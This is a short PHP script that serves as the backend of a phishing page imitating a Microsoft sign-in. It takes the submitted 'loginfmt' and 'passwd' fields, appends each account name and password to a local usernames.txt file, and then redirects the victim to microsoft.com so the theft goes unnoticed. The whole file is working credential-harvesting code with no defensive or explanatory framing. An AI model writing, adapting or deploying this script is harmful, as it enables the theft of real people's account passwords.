<?php

file_put_contents("usernames.txt", "\n". "Account: " . $_POST['loginfmt'] . " Pass: " . $_POST['passwd'] . "\n", FILE_APPEND);
header('Location: https://microsoft.com');
exit();
